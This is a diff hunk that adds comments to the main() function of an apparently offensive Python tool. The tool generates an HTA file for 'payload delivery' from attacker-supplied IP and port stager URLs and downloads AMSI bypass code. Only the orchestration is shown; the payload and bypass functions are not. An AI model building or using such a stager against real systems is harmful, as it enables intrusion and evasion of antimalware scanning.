@@ -75,16 +75,20 @@ def main():
     parser.add_argument("--tls", help="use HTTPS for stager URLs", action="store_true")
     args = parser.parse_args()
 
+    # play chicken if file already exists
     if os.path.isfile(F_HTA):
         print("{}: file already exists, exiting...".format(F_HTA))
         sys.exit(1)
 
+    # generate and save HTA for bypass and payload delivery
     hta = generate_hta(args.IP, args.port, args.tls)
     with open(F_HTA, "w") as f:
         f.write(hta)
     
+    # download the AMSI bypass code if needed and save it as F_AMSI_BYPASS
     download_amsi_bypass()
 
+    # some marginally helpful user instructions
     print("\nSUCCESS!!!\n")
     print("The following files have been saved to the current directory:")
     print("  '{}' - AMSI Bypass code (per https://rastamouse.me/2018/10/amsiscanbuffer-bypass-part-2/)".format(F_AMSI_BYPASS))
